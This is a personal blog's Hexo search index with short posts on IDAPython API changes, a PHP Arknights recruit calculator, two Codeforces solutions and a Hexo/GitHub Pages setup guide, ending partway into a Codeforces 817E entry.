<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Changes of Python API in IDA</title>
    <url>/2022/09/25/Changes-of-Python-API-in-IDA/</url>
    <content><![CDATA[<h1 id="Changes-of-Python-API-in-IDA-7-x"><a href="#Changes-of-Python-API-in-IDA-7-x" class="headerlink" title="Changes of Python API in IDA 7.x"></a>Changes of Python API in IDA 7.x</h1><span id="more"></span>
<h4 id="From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x"><a href="#From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x" class="headerlink" title="From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x."></a>From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x.</h4><h4 id="Website-that-may-help-you"><a href="#Website-that-may-help-you" class="headerlink" title="Website that may help you:"></a>Website that may help you:</h4><h4 id="blog-in-chinese"><a href="#blog-in-chinese" class="headerlink" title="blog in chinese"></a><a href="https://ybrc.github.io/zh-cn/14-2/">blog in chinese</a></h4><h4 id="IDAPython-documentation"><a href="#IDAPython-documentation" class="headerlink" title="IDAPython documentation"></a><a href="https://hex-rays.com/products/ida/support/idapython_docs/">IDAPython documentation</a></h4><h4 id="hex-rays"><a href="#hex-rays" class="headerlink" title="hex-rays"></a><a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">hex-rays</a></h4>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>arknights recruit calculator(1)</title>
    <url>/2022/08/27/arknights-recruit-calculator/</url>
    <content><![CDATA[<h1 id="arknights-recruit-calculator-1"><a href="#arknights-recruit-calculator-1" class="headerlink" title="arknights recruit calculator(1)"></a>arknights recruit calculator(1)</h1><h5 id="Published-2022-x2F-08-x2F-27"><a href="#Published-2022-x2F-08-x2F-27" class="headerlink" title="Published: 2022&#x2F;08&#x2F;27"></a>Published: 2022&#x2F;08&#x2F;27</h5><h5 id="Updated-2022-x2F-08-x2F-27"><a href="#Updated-2022-x2F-08-x2F-27" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;27"></a>Updated: 2022&#x2F;08&#x2F;27</h5><h3 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h3><ul>
<li>I’m pretty addicted to this game named Arknights these days, and there is this module named “公招”(“recruit” in English or whatever). So there is this calculator tools use to help you recruit what you want on website. One day it the website&#x2F;procedure were been maintained. And I been studying php for couples of days. That’s when I decided to build my own recruit calculator.</li>
<li>It’s still in testing phase, when it’s complete, I may put it on a website.</li>
<li>The php function mention below can be consulted on <a href="https://www.php.net/">php.net</a><span id="more"></span></li>
</ul>
<hr>
<h3 id="I-use-html-css-to-create-the-User-Interface-User-can-input-their-tags-5-at-most-in-one-post-and-program-will-output-the-cadres-that-fits-It-will-print-all-combination-of-the-tags-that-are-input"><a href="#I-use-html-css-to-create-the-User-Interface-User-can-input-their-tags-5-at-most-in-one-post-and-program-will-output-the-cadres-that-fits-It-will-print-all-combination-of-the-tags-that-are-input" class="headerlink" title="I use html, css to create the User Interface. User can input their tags(5 at most in one post), and program will output the cadres that fits(It will print all combination of the tags that are input)."></a>I use html, css to create the User Interface. User can input their tags(5 at most in one post), and program will output the cadres that fits(It will print all combination of the tags that are input).</h3><h3 id="The-UI-designed-was-easy-not-to-pursue-a-perfect-that-is-just-use-a-POST-method-and-let-the-php-program-receive-it-The-backend-devided-the-STRING-into-array-and-search-in-the-mysql"><a href="#The-UI-designed-was-easy-not-to-pursue-a-perfect-that-is-just-use-a-POST-method-and-let-the-php-program-receive-it-The-backend-devided-the-STRING-into-array-and-search-in-the-mysql" class="headerlink" title="The UI designed was easy(not to pursue a perfect, that is), just use a POST method and let the php program receive it. The backend devided the STRING into array, and search in the mysql."></a>The UI designed was easy(not to pursue a perfect, that is), just use a POST method and let the php program receive it. The backend devided the STRING into array, and search in the mysql.</h3><h3 id="There-is-this-problem-that-HOW-TO-ESTABLISH-THE-SQL-There-isn’t-a-sql-you-can-find-so-easily-that-is-ready-made-The-closest-thing-I-found-was-a-python-dictionary-I-wasn’t-going-to-wrote-the-program-in-python-So-I-need-to-transform-it-into-a-PHP-ARRAY-At-first-I-tried-to-use-C-to-read-the-py-dictionary-Obviously-it’s-too-complicate-and-I-should-have-better-choose–json-dumps-a-function-in-python-that-can-transform-a-dictionary-into-a-json-file-Like-this"><a href="#There-is-this-problem-that-HOW-TO-ESTABLISH-THE-SQL-There-isn’t-a-sql-you-can-find-so-easily-that-is-ready-made-The-closest-thing-I-found-was-a-python-dictionary-I-wasn’t-going-to-wrote-the-program-in-python-So-I-need-to-transform-it-into-a-PHP-ARRAY-At-first-I-tried-to-use-C-to-read-the-py-dictionary-Obviously-it’s-too-complicate-and-I-should-have-better-choose–json-dumps-a-function-in-python-that-can-transform-a-dictionary-into-a-json-file-Like-this" class="headerlink" title="There is this problem that HOW TO ESTABLISH THE SQL? There isn’t a sql you can find so easily that is ready made. The closest thing I found was a python dictionary. I wasn’t going to wrote the program in python. So I need to transform it into a PHP ARRAY. At first, I tried to use C to read the py dictionary. Obviously it’s too complicate and I should have better choose–json.dumps(),a function in python that can transform a dictionary into a json file. Like this:"></a>There is this problem that HOW TO ESTABLISH THE SQL? There isn’t a sql you can find so easily that is ready made. The closest thing I found was a python dictionary. I wasn’t going to wrote the program in python. So I need to transform it into a PHP ARRAY. At first, I tried to use C to read the py dictionary. Obviously it’s too complicate and I should have better choose–<code>json.dumps()</code>,a function in python that can transform a dictionary into a json file. Like this:</h3><blockquote>
<p><code>a=json.dumps(list)</code></p>
</blockquote>
<h3 id="However-it-outputted-errors-There-I-knew-json-dumps-cann’t-dail-with-Chinese-So-I-searched-for-solutions-and-code-down-whese"><a href="#However-it-outputted-errors-There-I-knew-json-dumps-cann’t-dail-with-Chinese-So-I-searched-for-solutions-and-code-down-whese" class="headerlink" title="However, it outputted errors. There I knew json.dumps cann’t dail with Chinese. So I searched for solutions and code down whese:"></a>However, it outputted errors. There I knew json.dumps cann’t dail with Chinese. So I searched for solutions and code down whese:</h3><blockquote>
<p><code>import json</code><br><code>import numpy as np</code><br><code>class Encoder(json.JSONEncoder):</code><br><code>    def default(self, obj):</code><br><code>        if isinstance(obj, np.ndarray):</code><br><code>            return obj.tolist()</code><br><code>        elif isinstance(obj, bytes):</code><br><code>            return str(obj, encoding=&#39;utf-8&#39;)</code><br><code>        return json.JSONEncoder.default(self, obj)</code><br><code>a=json.dumps(top_operators_list,cls=Encoder)</code><br><code>with open(&#39;tags.txt&#39;,&#39;a&#39;) as file0:</code><br><code>    print(a,file=file0)</code></p>
</blockquote>
<h3 id="It-actually-still-output-error-After-few-hours-I-found-the-dictionary’s-array-used-“-”-instead-of-“-”-Correct-all-of-that-it-works-and-I-got-a-json-file-containing-the-data-I-need"><a href="#It-actually-still-output-error-After-few-hours-I-found-the-dictionary’s-array-used-“-”-instead-of-“-”-Correct-all-of-that-it-works-and-I-got-a-json-file-containing-the-data-I-need" class="headerlink" title="It actually still output error. After few hours, I found the dictionary’s array used “{}” instead of “[]”. Correct all of that, it works and I got a json file containing the data I need."></a>It actually still output error. After few hours, I found the dictionary’s array used “{}” instead of “[]”. Correct all of that, it works and I got a json file containing the data I need.</h3><h3 id="Now-I-need-to-put-the-data-in-json-file-into-a-php-array-Luckly-there-is-this-function-json-decode-that-can-do-the-trick-So-now-the-array-was-prepared"><a href="#Now-I-need-to-put-the-data-in-json-file-into-a-php-array-Luckly-there-is-this-function-json-decode-that-can-do-the-trick-So-now-the-array-was-prepared" class="headerlink" title="Now, I need to put the data in json file into a php array. Luckly, there is this function json_decode that can do the trick. So now the array was prepared."></a>Now, I need to put the data in json file into a php array. Luckly, there is this function <code>json_decode</code> that can do the trick. So now the array was prepared.</h3><h3 id="To-search-the-cadres-you-can-combine-the-array-into-a-string-in-full-permutation-USING-DFS-TIPS-sort-your-string-each-time-you-search-will-make-the-work-much-easier"><a href="#To-search-the-cadres-you-can-combine-the-array-into-a-string-in-full-permutation-USING-DFS-TIPS-sort-your-string-each-time-you-search-will-make-the-work-much-easier" class="headerlink" title="To search the cadres, you can combine the array into a string in full permutation.(USING DFS) (TIPS:sort your string each time you search will make the work much easier.)"></a>To search the cadres, you can combine the array into a string in full permutation.(USING DFS) (TIPS:sort your string each time you search will make the work much easier.)</h3><h3 id="Designed-the-output-UI-and-it’s-all-done"><a href="#Designed-the-output-UI-and-it’s-all-done" class="headerlink" title="Designed the output UI, and it’s all done!"></a>Designed the output UI, and it’s all done!</h3>]]></content>
      <tags>
        <tag>tools</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-1719C</title>
    <url>/2022/08/29/codeforce-1719C/</url>
    <content><![CDATA[<h1 id="codeforces-1719C"><a href="#codeforces-1719C" class="headerlink" title="codeforces 1719C"></a>codeforces 1719C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Fighting Tournament<br>time limit per test2 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>Burenka is about to watch the most interesting sporting event of the year — a fighting tournament organized by her friend Tonya.<br>n athletes participate in the tournament, numbered from 1 to n. Burenka determined the strength of the i-th athlete as an integer ai, where 1≤ai≤n. All the strength values are different, that is, the array a is a permutation of length n. We know that in a fight, if ai&gt;aj, then the i-th participant always wins the j-th.<br>The tournament goes like this: initially, all n athletes line up in ascending order of their ids, and then there are infinitely many fighting rounds. In each round there is exactly one fight: the first two people in line come out and fight. The winner goes back to the front of the line, and the loser goes to the back.<br>Burenka decided to ask Tonya q questions. In each question, Burenka asks how many victories the i-th participant gets in the first k rounds of the competition for some given numbers i and k. Tonya is not very good at analytics, so he asks you to help him answer all the questions.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤104) — the number of test cases. Description of the test cases follows.<br>The first line of each test case contains two integers n and q (2≤n≤105, 1≤q≤105) — the number of tournament participants and the number of questions.<br>The second line of each test case contains n integers a1,a2,…,an (1≤ai≤n) — the array a, which is a permutation.<br>The next q lines of a test case contain questions. Each line contains two integers i and k (1≤i≤n, 1≤k≤109) — the number of the participant and the number of rounds.<br>It is guaranteed that the sum of n and the sum of q over all test cases do not exceed 105.<br>Output<br>For each Burenka’s question, print a single line containing one integer — the answer to the question.</p>
</blockquote>
</blockquote>
<!--more-->
<h4 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h4><h5 id="It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried"><a href="#It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried" class="headerlink" title="It’s not a very hard problem, but contains many details. This is the record when I tried:"></a>It’s not a very hard problem, but contains many details. This is the record when I tried:</h5><p><img src="/2022/08/29/codeforce-1719C/1719C.png"></p>
<hr>
<h5 id="The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”"><a href="#The-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-a-i-if-so-the-guy-with-the-number-i-CAN-NOT-WIN-ANYBODY-else-tried-to-find-the-number-of-the-guys-AFTER-HIM-with-smaller-a-This-number-is-the-BIGGEST-number-of-his-victories-You-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-met-depend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-“over”" class="headerlink" title="The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”."></a>The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”.</h5><h4 id="DETAILS"><a href="#DETAILS" class="headerlink" title="DETAILS"></a>DETAILS</h4><ul>
<li><h5 id="The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right"><a href="#The-first-and-second-guy-is-special-They-fight-each-other-You-can-see-that-i-gt-x3D-2-can-use-the-same-formula-So-you-shall-judge-i-x3D-x3D-1-specially-The-biggest-a-shall-also-be-judge-specially-With-those-you-answer-shall-be-right" class="headerlink" title="The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right."></a>The first and second guy is special. They fight each other. You can see that (i&gt;&#x3D;2) can use the same formula. So you shall judge (i&#x3D;&#x3D;1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right.</h5></li>
<li><h5 id="However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously"><a href="#However-you-might-get-a-“TLE”-Well-I-did-This-is-how-I-wrote-previously" class="headerlink" title="However, you might get a “TLE”(Well,I did). This is how I wrote previously:"></a>However, you might get a “TLE”(Well,I did). This is how I wrote previously:</h5><code>//		for (i=1;i&lt;=n;i++)&#123;</code>	<br><code>//			if (a[i]==maxn) continue;</code><br><code>//			for (j=i+1;j&lt;=n;j++)&#123;</code><br><code>//				if (a[j]&gt;=a[i]) break;</code><br><code>//				b[i]++;</code><br><code>//&#125;</code><br><code>//			b[i]++;</code><br><code>//			if (i==1) b[i]--;</code><br><code>//			for (j=1;j&lt;i;j++)&#123;</code><br><code>//				if (a[j]&gt;a[i])&#123;</code><br><code>//					b[i]=0;</code><br><code>//					break;</code><br><code>//				&#125;</code><br><code>//			&#125;</code><br><code>//		&#125;</code></li>
</ul>
<h5 id="Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way"><a href="#Clearly-O-n-2-is-too-slow-So-I-tried-to-find-another-way" class="headerlink" title="Clearly, O(n^2) is too slow. So I tried to find another way."></a>Clearly, O(n^2) is too slow. So I tried to find another way.</h5><h5 id="We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this"><a href="#We-can-find-that-the-whole-work-can-be-done-in-LINEAR-TIME-Like-this" class="headerlink" title="We can find that the whole work can be done in LINEAR TIME. Like this:"></a>We can find that the whole work can be done in LINEAR TIME. Like this:</h5><p><code>		int lld=1;</code><br><code>		for (i=1;i&lt;n;i++)&#123;</code><br><code>			if (a[i]&gt;a[i+1])&#123;</code><br><code>				b[lld]++;</code><br><code>				a[i+1]=a[i];</code><br><code>			&#125;</code><br><code>			else&#123;</code><br><code>				lld=i+1;</code><br><code>				b[lld]++;</code><br><code>			&#125;</code><br><code>		&#125;</code></p>
<h5 id="It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done"><a href="#It’s-not-hard-to-understand-but-effective-Just-read-it-once-in-O-n-the-work-is-done" class="headerlink" title="It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done."></a>It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done.</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce:1720C</title>
    <url>/2022/08/28/codeforce-1720C/</url>
    <content><![CDATA[<h1 id="codeforces-1720C"><a href="#codeforces-1720C" class="headerlink" title="codeforces 1720C"></a>codeforces 1720C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Corners<br>time limit per test1 second<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You are given a matrix consisting of n rows and m columns. Each cell of this matrix contains 0 or 1.<br>Let’s call a square of size 2×2 without one corner cell an L-shape figure. In one operation you can take one L-shape figure, with at least one cell containing 1 and replace all numbers in it with zeroes.<br>Find the maximum number of operations that you can do with the given matrix.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤500) — the number of test cases. Then follow the descriptions of each test case.<br>The first line of each test case contains two integers n and m (2≤n,m≤500) — the size of the matrix.<br>Each of the following n lines contains a binary string of length m — the description of the matrix.<br>It is guaranteed that the sum of n and the sum of m over all test cases does not exceed 1000.<br>Output<br>For each test case output the maximum number of operations you can do with the given matrix.</p>
</blockquote>
</blockquote>
<!--more-->
<h5 id="At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this"><a href="#At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this" class="headerlink" title="At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:"></a>At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:</h5><blockquote>
</blockquote>
<p><code>sum[x][y]=max(sum[x-1][y-1]+b[x][y]-b[x-1][y-1],sum[x-2][y-2]+b[x][y]-b[x-2][y-2])</code></p>
<h6 id="sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y"><a href="#sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y" class="headerlink" title="sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y]."></a>sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y].</h6><h5 id="It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method"><a href="#It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method" class="headerlink" title="It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method."></a>It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method.</h5><h5 id="It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy"><a href="#It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy" class="headerlink" title="It was some time before the right answer occur to me. It’s actually pretty easy."></a>It was some time before the right answer occur to me. It’s actually pretty easy.</h5><h5 id="Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’"><a href="#Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’" class="headerlink" title="Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)"></a>Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>to build your blog on github</title>
    <url>/2022/08/26/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Build-Blog-with-Hexo-and-GitHub-Pages"><a href="#Build-Blog-with-Hexo-and-GitHub-Pages" class="headerlink" title="Build Blog with Hexo and GitHub Pages"></a>Build Blog with Hexo and GitHub Pages</h1><h5 id="Published-2022-x2F-08-x2F-26"><a href="#Published-2022-x2F-08-x2F-26" class="headerlink" title="Published: 2022&#x2F;08&#x2F;26"></a>Published: 2022&#x2F;08&#x2F;26</h5><h5 id="Updated-2022-x2F-08-x2F-26"><a href="#Updated-2022-x2F-08-x2F-26" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;26"></a>Updated: 2022&#x2F;08&#x2F;26</h5><h2 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h2><h3 id="As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog"><a href="#As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog" class="headerlink" title="As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog."></a>As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog.</h3><h3 id="THE-THINGS-NEED-TO-BE-DONE"><a href="#THE-THINGS-NEED-TO-BE-DONE" class="headerlink" title="THE THINGS NEED TO BE DONE"></a>THE THINGS NEED TO BE DONE</h3><span id="more"></span>
<hr>
<blockquote>
<p>hexo</p>
<blockquote>
<p>Hexo is a blog framework based on Node.js. We can maintain a Hexo instance on local machine, and publish it to Github pages.</p>
</blockquote>
</blockquote>
<blockquote>
<p>node.js</p>
<blockquote>
<p>an free open source server environment which can be ran on Windows, Linux, Unix, Mac OS X, ect.</p>
</blockquote>
</blockquote>
<blockquote>
<p>set up the github account</p>
<blockquote>
<p>GitHub Pages is a static site hosting service designed to host your personal, organization or project pages directly from a GitHub repository</p>
</blockquote>
</blockquote>
<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><h4 id="Go-to-Download-Node-js-choose-and-install-the-right-version-for-your-computer"><a href="#Go-to-Download-Node-js-choose-and-install-the-right-version-for-your-computer" class="headerlink" title="Go to Download - Node.js, choose and install the right version for your computer."></a>Go to <a href="https://nodejs.org/en/download/">Download - Node.js</a>, choose and install the right version for your computer.</h4><h4 id="Run-node-v-then-npm-v-on-cmd-check-your-Node-js-version-if-it-doesn’t-output-two-version-of-node-and-npm"><a href="#Run-node-v-then-npm-v-on-cmd-check-your-Node-js-version-if-it-doesn’t-output-two-version-of-node-and-npm" class="headerlink" title="Run node -v then npm -v on cmd, check your Node.js version if it doesn’t output two version of node and npm."></a>Run <code>node -v</code> then <code>npm -v</code> on cmd, check your Node.js version if it doesn’t output two version of node and npm.</h4><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><h4 id="Go-to-Download-git-leave-the-options-default-if-you-don’t-understand"><a href="#Go-to-Download-git-leave-the-options-default-if-you-don’t-understand" class="headerlink" title="Go to Download - git, leave the options default if you don’t understand."></a>Go to <a href="https://git-scm.com/downloads">Download - git</a>, leave the options default if you don’t understand.</h4><h4 id="When-you-are-done-use-cmd-to-chack-if-you-do-it-right-by-run"><a href="#When-you-are-done-use-cmd-to-chack-if-you-do-it-right-by-run" class="headerlink" title="When you are done, use cmd to chack if you do it right by run"></a>When you are done, use cmd to chack if you do it right by run</h4><blockquote>
<p><code>git --version</code></p>
</blockquote>
<h4 id="If-it-outputs-your-git-version-you-do-it-right"><a href="#If-it-outputs-your-git-version-you-do-it-right" class="headerlink" title="If it outputs your git version, you do it right."></a>If it outputs your git version, you do it right.</h4><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><code>git config --global user.name &quot;Your Name&quot;</code><br><code>git config --global user.email youremail@example.com</code><br><code> ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p>
<h4 id="and-you-will-get-two-files-your-own-screen-name-and-your-email"><a href="#and-you-will-get-two-files-your-own-screen-name-and-your-email" class="headerlink" title="and you will get two files(your own screen name and your email)"></a>and you will get two files(your own screen name and your email)</h4><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><h4 id="Run-npm-install-hexo-cli-g-on-a-folder-you-would-like-to"><a href="#Run-npm-install-hexo-cli-g-on-a-folder-you-would-like-to" class="headerlink" title="Run npm install hexo-cli -g on a folder you would like to"></a>Run <code>npm install hexo-cli -g</code> on a folder you would like to</h4><h4 id="Run-hexo-init-and-npm-install-on-THE-FOLDER-YOU-WANT-TO-PUT-YOUR-BLOG-IN-run-hexo-version-hexo-v-to-verify-Hexo"><a href="#Run-hexo-init-and-npm-install-on-THE-FOLDER-YOU-WANT-TO-PUT-YOUR-BLOG-IN-run-hexo-version-hexo-v-to-verify-Hexo" class="headerlink" title="Run hexo init and npm install on THE FOLDER YOU WANT TO PUT YOUR BLOG IN, run hexo version(hexo -v) to verify Hexo."></a>Run <code>hexo init</code> and <code>npm install</code> on THE FOLDER YOU WANT TO PUT YOUR BLOG IN, run <code>hexo version</code>(<code>hexo -v</code>) to verify Hexo.</h4><h4 id="run-hexo-g-then-hexo-s-hexo-server-and-visit-your-blog-http-localhost-4000-the-default-port-is-4000-if-it-reports-error-try-to-run-hexo-s-i-i-stands-for-the-port-that-isn’t-occupied"><a href="#run-hexo-g-then-hexo-s-hexo-server-and-visit-your-blog-http-localhost-4000-the-default-port-is-4000-if-it-reports-error-try-to-run-hexo-s-i-i-stands-for-the-port-that-isn’t-occupied" class="headerlink" title="run hexo g then hexo s (hexo server) and visit your blog (http://localhost:4000, the default port is 4000, if it reports error, try to run hexo s -i, i stands for the port that isn’t occupied)"></a>run <code>hexo g</code> then <code>hexo s</code> <code>(hexo server)</code> and visit <a href="http://localhost:4000/">your blog</a> (<a href="http://localhost:4000/">http://localhost:4000</a>, the default port is 4000, if it reports error, try to run <code>hexo s -i</code>, i stands for the port that isn’t occupied)</h4><h4 id="find-config-yml-find-deploy-part-and-edit"><a href="#find-config-yml-find-deploy-part-and-edit" class="headerlink" title="find _config.yml, find deploy:,part and edit:"></a>find <code>_config.yml</code>, find <code>deploy:</code>,part and edit:</h4><p><code>deploy:</code><br><code>type: git</code><br><code>repo: git@github.com:yourname/yourname.github.io.git</code><br><code>branch: master</code></p>
<h3 id="Create-a-GitHub-Repository"><a href="#Create-a-GitHub-Repository" class="headerlink" title="Create a GitHub Repository"></a>Create a GitHub Repository</h3><h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS:"></a>TIPS:</h4><h4 id="Change-your-GitHub-Branch-from-“main”-to-“Master”"><a href="#Change-your-GitHub-Branch-from-“main”-to-“Master”" class="headerlink" title="Change your GitHub Branch from “main” to “Master”"></a>Change your GitHub Branch from “main” to “Master”</h4><h4 id="Find-a-file-end-with-“id-rsa-pub”-which-generated-when-you-install-git-and-get-the-ssh-key-above-Copy-it-and-paste-it-into-your-GitHub-Repository-ssh-key"><a href="#Find-a-file-end-with-“id-rsa-pub”-which-generated-when-you-install-git-and-get-the-ssh-key-above-Copy-it-and-paste-it-into-your-GitHub-Repository-ssh-key" class="headerlink" title="Find a file end with “id_rsa.pub” which generated when you install git and get the ssh key above. Copy it and paste it into your GitHub Repository ssh key"></a>Find a file end with “id_rsa.pub” which generated when you install git and get the ssh key above. Copy it and paste it into your GitHub Repository ssh key</h4><h4 id="run-npm-install-hexo-deployer-git-save"><a href="#run-npm-install-hexo-deployer-git-save" class="headerlink" title="run npm install hexo-deployer-git --save"></a>run <code>npm install hexo-deployer-git --save</code></h4><h3 id="Now-run-hexo-d-g-and-visit-your-GitHub-wesite-which-you-can-find-in-your-repository-SETTING-you-should-see-your-blog-above"><a href="#Now-run-hexo-d-g-and-visit-your-GitHub-wesite-which-you-can-find-in-your-repository-SETTING-you-should-see-your-blog-above" class="headerlink" title="Now, run hexo d -g and visit your GitHub wesite (which you can find in your repository SETTING), you should see your blog above."></a>Now, run <code>hexo d -g</code> and visit your GitHub wesite (which you can find in your repository SETTING), you should see your blog above.</h3>]]></content>
      <tags>
        <tag>tools</tag>
        <tag>hexo</tag>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-817E</title>
    <url>/2022/09/02/codeforce-817E/</url>
    <content><![CDATA[<h1 id="codeforces-817E"><a href="#codeforces-817E" class="headerlink" title="codeforces 817E"></a>codeforces 817E</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
